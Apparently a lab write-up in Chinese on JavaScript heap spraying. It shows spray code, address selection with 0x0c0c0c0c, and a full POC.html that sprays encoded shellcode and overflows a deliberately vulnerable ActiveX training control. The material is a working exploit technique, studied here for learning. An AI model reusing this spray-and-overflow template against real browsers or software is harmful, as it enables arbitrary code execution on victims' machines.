
###  這實驗也很簡單，用javascript 申請很多的堆空間。

####  一個大小 = 1MB [  heap header    +    (大量)nops    +       shellcode] 的片段，總共申請200個

####   只要能擊中 nops 就能執行 shellcode 
---


#### 用以下代碼測試 aslr heap 隨機的狀況

```
<html>
  <script>
    var nops = unescape("%u9090%u9090");
	while(nops.length < 0x100000 / 2)
		nops += nops;
	nops = nops.substring(0, 0x100000 / 2 - 32 / 2 - 4 / 2 - 2 / 2 - 2);
	nops = unescape("%u8281%u8182") + nops;
	var memory = new Array();
	for(var i = 0; i < 200; i++)
		memory[i] += nops;
  </script>
</html>
``` 
----
![enter image description here](https://i.imgur.com/1n1sh6z.png)

----
####      0x100000 =   1048576 (1byte x 1024 x 1024 ) = 1MB

#### [ 堆頭結構  + \x81828281 + nops ]  申請 200個 

#### OllyFindaddr插件  搜尋  81828281 看看我們每個堆的位置
![enter image description here](https://i.imgur.com/dY0RmVn.png)

![enter image description here](https://i.imgur.com/larE10T.png)


####   經過多次測試，可以發現堆申請的起始位置大多都是0x05xxxxxx 開始申請。

####  Heap spray 出 0x05xxxxxx   ---  0x12xxxxxx 的位址有很多可以選擇


####  所以我們其實在可以隨便亂選一個位址，但是要注意盡量別選片段的尾端，有可能你直接執行到shellcode 的中間就會失敗。所以靠近中間會穩定一點。

####  另一個是也不要選太前面有可能選到堆的頭部結構，也有可能會失敗。

####  再來如果搭配其它攻擊。例如 dword shooting 會有指針反射現象。這個時候你選的位址就非常重要。 例如\x0c0c0c0c 的指令被解釋為:

  ![enter image description here](https://i.imgur.com/qJeCWb5.png)
 



####  是個無害指令。

####   註冊VunlerAX.ocx 

####   POC.html
```
<html>  
<body>  
<script>
	var nops = unescape("%u9090%u9090");
	shellcode  = "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91";
	shellcode += "\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332";
	shellcode += "\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c";
	shellcode += "\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505";
	shellcode += "\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b";
	shellcode += "\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06";
	shellcode += "\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c";
	shellcode += "\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd";
	shellcode += "\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33";
	shellcode += "\u6853\u6a2d\u626f\u6768\u6f6f\u8b64\u53c4\u5050";
	shellcode += "\uff53\ufc57\uff53\uf857";
	while(nops.length < 0x100000)
		nops += nops;
	nops = nops.substring(0, 0x100000 / 2 - 32 / 2 - 4 / 2 - 2 / 2 - shellcode.length);
	nops += shellcode;
	var memory = new Array();
	for(var i = 0; i < 200; i++)
		memory[i] += nops;
</script>
<object classid="clsid:39F64D5B-74E8-482F-95F4-918E54B1B2C8" id="test"></object>  
<script>
	var s = "\u9090";
	while(s.length < 54)
		s += "\u9090";
	s += "\u0c0c\u0c0c";
	test.test(s);  
</script>  
</body>  
</html>
```


####  成功
![enter image description here](https://i.imgur.com/qF9dZ5p.png)




###  後記

####   後面還有一個 java applet 的heap spray 原理一模一樣。 和 .net 禁用ASLR  ，考慮到環境問題以及這招感覺不是很好用。 就不實驗了。
